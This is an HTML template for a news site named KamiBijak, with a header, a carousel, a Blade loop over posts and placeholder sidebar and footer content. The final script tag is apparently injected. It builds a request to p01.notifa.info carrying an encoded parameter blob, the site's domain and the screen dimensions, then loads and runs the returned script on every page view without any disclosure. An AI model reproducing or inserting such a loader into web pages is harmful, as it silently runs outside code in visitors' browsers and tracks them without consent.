<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>KamiBijak </title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- Place favicon.ico in the root directory -->
   <!--  <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
    <link rel="apple-touch-icon" href="apple-touch-icon.html"> -->
    
    <!-- All css files are included here. -->
    <!-- Bootstrap fremwork main css -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/core.css">
    <link rel="stylesheet" href="css/shortcode/shortcodes.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/responsive.css">
    <link rel="stylesheet" href="css/custom.css">
    <link rel="stylesheet" href="css/style-customizer.css">
     <!-- Import Font -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
    <!-- Style customizer (Remove these lines please) -->
    <link rel="stylesheet" href="css/style-customizer.css">
    <!-- Import Slick CSS -->
    <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
    <!-- Import Icon CSS-->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

    <!-- Modernizr JS -->
    <script src="js/vendor/modernizr-2.8.3.min.js"></script>
</head>
<body>
    
     
  

    <!-- Body main wrapper start -->
    <div class="wrapper">
        <!-- Start of header area -->
        <header>
            
        <div class="navbar-kb white py-4" >
            <div class="row m-0" >
                <div class="col-2 align-self-center">
                    <div class="w-100 d-flex">
                        <div class="w-25" style="display: inline-grid;">             
                            <button type="button" class="float-left btn-nav" onclick="openNav()" ><img src="images/menu.svg" alt="menu" style="width: 25px;height: 20px;"/> </button>      
                        </div>
                        <div class="w-50 align-self-center" style="display: inline-grid;" >
                            <a href="index.php" class="text-grey" > <img src="images/logo.png" class="w-100 h-auto float-left" align="logo" /></a>
                        </div>
                    </div>

                </div>
                <div class="col-4 col-lg-3 align-self-center">
                    <!-- pencarian
                    <form name="formcari" method="post" action="search_exe.php">
                    -->
                    <input class="form-control" type="text" placeholder="Cari disini">

                </div>
                <div class="col-4 col-lg-5 align-self-center">
                    <ul class="list-unstyled">
                        <li class="float-left"><a href="Infosiana.php" class="text-grey">INFOSIANA</a></li>
                        <li class="float-left"><a href="Hiburan.php" class="text-grey">HIBURAN & GAYA HIDUP</a></li>
                        <li class="float-left"><a href="Kuliner.php" class="text-grey">KULINER</a></li>
                        <li class="float-left"><a href="#" class="text-white btn-upload red ">Upload</a></li>
                    </ul>
                </div>
                <div class="col-2 align-self-center">
                    <div class="w-100 d-flex">
                        <div class="notif-sec " style="display: inline-grid;width: 20%;">
                            <div class="message-notif position-relative">
                                <img src="images/mail.svg" class="position-absolute align-top" style="width: 20px;height: 20px;right: 38%;left: auto;" alt="mess" />
                                <span class="red rounded-circle position-absolute text-white align-bottom p-1" style="font-size: .65rem;right: 23%;left: auto;margin-top: -12px;">25</span>
                            </div>
                        </div>
                        <div class="notif-sec " style="display: inline-grid;width: 20%;">
                            <div class="message-notif position-relative">
                                <img src="images/notif.svg" class="position-absolute align-top" style="width: 20px;height: 20px;right: 38%;left: auto;" alt="mess" onclick="openNotif()"/>
                                <span class="red rounded-circle position-absolute text-white align-bottom p-1" style="font-size: .65rem;right: 23%;left: auto;margin-top: -12px;">54</span>
                            </div>
                        </div>
                        <div class="notif-sec " style="display: inline-grid;width: 60%;">
                            <div class="message-notif position-relative text-right">
                                <span class="text-grey" style="font-size: .75rem;">John Doe</span>
                                <img src="images/ava.jpg" class="align-top rounded-circle ml-2" style="width: 25px;height: 25px;" alt="mess" />                            
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>           
        </header>
        <!-- End of header area -->

        <!-- Start Slider post area -->
        <div class="slider-post-area ">
            <div class="container ">
                <div class="row ">
                    <div class="col-md-12 " style="height: 50%">
                        <div class="slider-post-area-content">
                            <ul class="slide-posts owl-carousel list-unstyled">
                                <li class="item">
                                    <img src="images/post/slider/1.jpg" alt="img">
                                </li>
                                <li class="item">
                                    <img src="images/post/slider/2.jpg" alt="img">
                                </li>
                                <li class="item">
                                    <img src="images/post/slider/3.jpg" alt="img">
                                </li>
                                <li class="item">
                                    <img src="images/post/slider/4.jpg" alt="img">
                                </li>
                                <li class="item">
                                    <img src="images/post/slider/5.jpg" alt="img">
                                </li>
                                <li class="item">
                                    <img src="images/post/slider/6.jpg" alt="img">
                                </li>
                            </ul><!--/.owl-slider-->
                            <ul class="posts-thumbnails-wrapper list-unstyled">
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/1.jpg" alt="img"></a>
                                </li>
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/2.jpg" alt="img"></a>
                                </li>
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/3.jpg" alt="img"></a>
                                </li>
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/4.jpg" alt="img"></a>
                                </li>
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/5.jpg" alt="img"></a>
                                </li>
                                <li class="post-thumbnail">
                                    <a href="#"><img src="images/post/slider/6.jpg" alt="img"></a>
                                </li>
                            </ul>
                        </div>
                    </div>                    
                </div>
            </div>
        </div>
        <!-- End Slider post area -->
        <!-- Start page content -->
        <section id="page-content" class="page-wrapper">
            <div class="zm-section bg-white pt-30 xs-pt-30 sm-pt-30 pb-40">
                <div class="container">
                    <div class="row">
                        <!-- Start left side -->
                        <div class="col-xs-12 col-sm-12 col-md-8 col-lg-8 columns">
                            <div class="row mb-40">
                                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                    <div class="section-title">
                                        <h2 class="h6 header-color inline-block uppercase">Latest News</h2>
                                    </div>
                                </div>
                            </div>

                            


                            <div class="row">
                                <div class="col-md-12">
                                    <div class="zm-posts">
                                        @foreach($posts as $row)
                                        <!-- Start single post layout C -->
                                        <article class="zm-post-lay-c zm-single-post clearfix">
                                            <div class="zm-post-thumb f-left">
                                                <!-- <a href="blog-single-image.html" class="wh"><img src="images/post/c/11.jpg" alt="img"></a> -->
                                                <!-- <img src="images/post/c/11.jpg" alt="img"> -->
                                                <iframe class="iframewh" src="{{$row['embed']}}" frameborder="0" allow="encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                                                
                                            </div>
                                            <div class="zm-post-dis f-right">
                                                <div class="zm-post-header">
                                                    <div class="zm-category"><a href="#" class="bg-cat-1 cat-btn">{{$row['category']}}</a></div>
                                                    <h2 class="zm-post-title"><a href="blog-single-image.html">{{$row['title']}}</a></h2>
                                                    <div class="zm-post-meta">
                                                        <ul>
                                                            <li class="s-meta"><a href="#" class="zm-author">{{$row['publisher']}}</a></li>
                                                            <li class="s-meta"><a href="#" class="zm-date">{{$row['created_at']}}</a></li>
                                                        </ul>
                                                    </div>
                                                    <div class="zm-post-content">
                                                        <p>{{$row['cont_sum']}}.</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </article>
                                        @endforeach

                                        {{$posts->links()}}
                                        <!-- Start single post layout C -->
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- End left side -->
                        <!-- Start Right sidebar -->
                        <div class="col-xs-12 col-sm-12 col-md-4 col-lg-4 sidebar-warp columns">
                            <div class="row">
                                <!-- Start Subscribe From -->
                                <div class="col-md-12 col-sm-6 col-lg-12 sm-mt-60 xs-mt-60">
                                    <aside class="subscribe-form bg-dark text-center sidebar">
                                        <h3 class="uppercase zm-post-title">Get Email Updates</h3>
                                        <p>Join 80,000+ awesome subscribers and update yourself with our exclusive news.</p>
                                        <form action="#">
                                            <input placeholder="Enter your full name" type="text">
                                            <input placeholder="Enter email address" required="" type="email">
                                            <input value="Subscribe" type="submit">
                                        </form>
                                    </aside>
                                </div>
                                <!-- End Subscribe From -->
                                <!-- Start post layout E -->
                                <aside class="zm-post-lay-e-area col-md-12 col-sm-6 col-lg-12 mt-60">
                                    <div class="row mb-40">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="section-title">
                                                <h2 class="h6 header-color inline-block uppercase">Most Commented</h2>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="zm-posts">
                                                <!-- Start single post layout E -->
                                                <article class="zm-post-lay-e zm-single-post clearfix">
                                                    <div class="zm-post-thumb f-left">
                                                        <a href="blog-single-image.html"><img src="images/post/e/9.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis f-right">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title"><a href="blog-single-image.html">Magna aliqua ut enim ad minim veniam quis nostrud.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                                <!-- Start single post layout E -->
                                                <!-- Start single post layout E -->
                                                <article class="zm-post-lay-e zm-single-post clearfix">
                                                    <div class="zm-post-thumb f-left">
                                                        <a href="blog-single-image.html"><img src="images/post/e/22.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis f-right">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title"><a href="blog-single-image.html">Enim ad minim veniam nostrud xercitation ullamco.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                                <!-- Start single post layout E -->
                                                <!-- Start single post layout E -->
                                                <article class="zm-post-lay-e zm-single-post clearfix">
                                                    <div class="zm-post-thumb f-left">
                                                        <a href="blog-single-image.html"><img src="images/post/e/23.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis f-right">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title"><a href="blog-single-image.html">Laboris nisi ut aliquip dolor in elit reprehenderit velit esse.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                                <!-- Start single post layout E -->
                                                <!-- Start single post layout E -->
                                                <article class="zm-post-lay-e zm-single-post hidden-sm clearfix">
                                                    <div class="zm-post-thumb f-left">
                                                        <a href="blog-single-image.html"><img src="images/post/e/24.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis f-right">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title"><a href="blog-single-image.html">Duis aute irure dolor in velit esse cillum fugiat nulla.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                                <!-- Start single post layout E -->
                                                <!-- Start single post layout E -->
                                                <article class="zm-post-lay-e zm-single-post hidden-sm clearfix">
                                                    <div class="zm-post-thumb f-left">
                                                        <a href="blog-single-image.html"><img src="images/post/e/25.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis f-right">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title"><a href="blog-single-image.html">Laboris nisi ut aliquip dolor in elit reprehenderit velit esse.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                                <!-- Start single post layout E -->
                                            </div>
                                        </div>
                                    </div>
                                </aside>
                                <!-- End post layout E -->
                                <aside class="zm-post-lay-f-area col-md-12 col-sm-6 col-lg-12 mt-60 sm-mt-60">
                                    <div class="row mb-40">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="section-title">
                                                <h2 class="h6 header-color inline-block uppercase">Recent Commented</h2>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="zm-posts">
                                                <!-- Start single post layout F -->
                                                <div class="zm-post-lay-f zm-single-post clearfix">
                                                    <div class="zm-post-dis">
                                                        <p><a href="#"> Nasir Uddin </a> - <em>“ Ut enim ad minim veniam, quis nostrud, sed do eiusmod tempor...” </em>  <strong>on Magna aliqua ut enim ad minim veniam quis nostrud.</strong></p>
                                                    </div>
                                                </div>
                                                <!-- Start single post layout F -->
                                                <!-- Start single post layout F -->
                                                <div class="zm-post-lay-f zm-single-post clearfix">
                                                    <div class="zm-post-dis">
                                                        <p><a href="#"> Sayeed Ahmad </a> - <em> “ Ut enim ad minim veniam, quis nostrud, sed do eiusmod tempor...” </em> <strong>on Magna aliqua ut enim ad minim veniam quis nostrud.</strong></p>
                                                    </div>
                                                </div>
                                                <!-- Start single post layout F -->
                                                <!-- Start single post layout F -->
                                                <div class="zm-post-lay-f zm-single-post clearfix">
                                                    <div class="zm-post-dis">
                                                        <p><a href="#"> ThemeHook </a> - <em> “ Ut enim ad minim veniam, quis nostrud, sed do eiusmod tempor...” </em> <strong>on Magna aliqua ut enim ad minim veniam quis nostrud.</strong></p>
                                                    </div>
                                                </div>
                                                <!-- Start single post layout F -->
                                                <!-- Start single post layout F -->
                                                <div class="zm-post-lay-f zm-single-post clearfix">
                                                    <div class="zm-post-dis">
                                                        <p><a href="#"> Nasir Uddin </a> - <em> “ Ut enim ad minim veniam, quis nostrud, sed do eiusmod tempor...” </em> <strong>on Magna aliqua ut enim ad minim veniam quis nostrud.</strong></p>
                                                    </div>
                                                </div>
                                                <!-- Start single post layout F -->
                                            </div>
                                        </div>
                                    </div>
                                </aside>
                                <aside class="zm-post-lay-a-area col-md-12 col-sm-6 col-lg-12 mt-60">
                                    <div class="row mb-40">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="section-title">
                                                <h2 class="h6 header-color inline-block uppercase">Today’s Tips</h2>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                            <div class="zm-posts">
                                                <article class="zm-post-lay-a sidebar">
                                                    <div class="zm-post-thumb">
                                                        <a href="blog-single-image.html"><img src="images/post/b/2.jpg" alt="img"></a>
                                                    </div>
                                                    <div class="zm-post-dis">
                                                        <div class="zm-post-header">
                                                            <h2 class="zm-post-title h2"><a href="blog-single-image.html">Consectetur adipisicing elit sed eiusmod tempor incididunt.</a></h2>
                                                            <div class="zm-post-meta">
                                                                <ul>
                                                                    <li class="s-meta"><a href="#" class="zm-author">Thomson Smith</a></li>
                                                                    <li class="s-meta"><a href="#" class="zm-date">April 18, 2016</a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </article>
                                            </div>
                                        </div>
                                    </div>
                                </aside>
                            </div>
                        </div>
                        <!-- End Right sidebar -->
                    </div>

                    <!-- Start pagination area -->
                    <!-- <div class="row hidden-xs">
                        <div class="zm-pagination-wrap mt-70">
                            <div class="container">
                                <div class="row">
                                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                        <nav class="zm-pagination ptb-40 text-center">
                                            <ul class="page-numbers">
                                                <li><a class="prev page-numbers" href="#">Previous</a></li>
                                                <li><span class="page-numbers current">1</span></li>
                                                <li><a class="page-numbers" href="#">2</a></li>
                                                <li><a class="page-numbers" href="#">3</a></li>
                                                <li><a class="page-numbers" href="#">4</a></li>
                                                <li><a class="page-numbers" href="#">5</a></li>
                                                <li><span class="page-numbers zm-pgi-dots">...</span></li>
                                                <li><a class="page-numbers" href="#">15</a></li>
                                                <li><a class="next page-numbers" href="#">Next</a></li>
                                            </ul>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div> -->
                    <!-- End pagination area -->

                    <!-- Start Advertisement -->
                    <!-- <div class="advertisement">
                        <div class="row mt-40">
                            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 text-center">
                                <a href="#"><img src="images/ad/2.jpg" alt=""></a>
                            </div>
                        </div>
                    </div> -->
                    <!-- End Advertisement -->
                </div>
            </div>
        </section>
        <!-- End page content -->
        <!-- Start footer area -->
        <footer id="footer" class="footer-wrapper footer-2">
            <!-- Start footer top area -->
            <div class="footer-top-wrap ptb-70 bg-dark">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6 col-md-6 col-lg-3">
                            <div class="zm-widget pr-20">
                                <h2 class="h6 zm-widget-title uppercase text-white mb-30">About Znews</h2>
                                <div class="zm-widget-content">
                                    <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto.</p>
                                    <div class="zm-social-media zm-social-2">
                                        <ul>
                                            <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                            <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                            <li><a href="#"><i class="fa fa-pinterest"></i></a></li>
                                            <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                            <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-6 col-md-6 col-lg-3">
                            <div class="zm-widget pl-20 pr-40">
                                <h2 class="h6 zm-widget-title uppercase text-white mb-30">Social Links</h2>
                                <div class="zm-widget-content">
                                    <div class="zm-category-widget zm-category-1">
                                        <ul>
                                            <li><a href="#">Business<span>22</span></a></li>
                                            <li><a href="#">Fashion<span>18</span></a></li>
                                            <li><a href="#">Sports<span>09</span></a></li>
                                            <li><a href="#">Technology<span>35</span></a></li>
                                            <li><a href="#">Entertainment<span>7</span></a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-6 col-md-6 col-lg-3">
                            <div class="zm-widget">
                                <h2 class="h6 zm-widget-title uppercase text-white mb-30">Subscribe Newsletter</h2>
                                <!-- Start Subscribe From -->
                                <div class="zm-widget-content">
                                    <div class="subscribe-form subscribe-footer">
                                        <p>Join 80,000+ awesome subscribers and update yourself with our exclusive news.</p>
                                        <form action="#">
                                            <input type="email" placeholder="Enter email address" required="">
                                            <input type="submit" value="Subscribe">
                                        </form>
                                    </div>
                                </div>
                                <!-- End Subscribe From -->
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-6 col-md-6 col-lg-3">
                            <div class="zm-widget pl-40">
                                <h2 class="h6 zm-widget-title uppercase text-white mb-30">flickr Photo</h2>
                                <div class="zm-widget-content">
                                    <div class="zm-flickr">
                                        <ul>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/1.jpg" alt=""></a></li>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/2.jpg" alt=""></a></li>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/3.jpg" alt=""></a></li>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/4.jpg" alt=""></a></li>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/5.jpg" alt=""></a></li>
                                            <li><a href="blog-single-image.html"><img src="images/post/flicker/6.jpg" alt=""></a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- End footer top area -->
            <div class="footer-buttom bg-black ptb-15">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <div class="zm-copyright text-center">
                                <p class="uppercase">&copy; 2016 Your Company. All Rights Reserved.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!-- End footer area -->
    </div>
    <!-- Body main wrapper end -->

    
    

    <!-- Placed js at the end of the document so the pages load faster -->
    <!-- jquery latest version -->
    <script src="js/vendor/jquery-1.12.1.min.js"></script>
    <!-- Bootstrap framework js -->
    <script src="js/bootstrap.min.js"></script>
    <!-- All js plugins included in this file. -->
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/plugins.js"></script>
    <!-- Main js file that contents all jQuery plugins activation. -->
    <script src="js/main.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2fD7Dg8xeBPVN7BzRS4j5Uq8zY6tc7s1HwcvSIHoAmJUTrOTXQVY%2fsKzAdwZbNp4%2fQ3kjLhPCdRM333X7PFYqcO0k3irn9jZWxIj5tNsyn8as%2f%2bvmizQ1j4dOcnQ7Ll3gZyIUBpUfTvlrZrjFppUpn%2ftycVI1qOvvxIyT37sdOFdJquKJzsTCMprTpDhVY7Dn3G%2fvub7GUKrJqJo5hoFXtQCmvoF2TYE5UqUnPtWXs9P4treE7JWWv7iTy%2fTGuqLOUkg%2bVfP7qYHREUsa%2fgU5mMpiHbAvZxZyv0M5gzd%2b%2bOujww6M3x2SVCOSGgI0J3bH46Vk7T6TX5tBR0LrK%2bWjpGkNumWDW9BANiIiG49WtFq6gWXdicvvWzs07zxnu9WfDwvkr7CmzcyxcNRD2EQMOkptRdCyKEWjGZUa5UR6JZM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>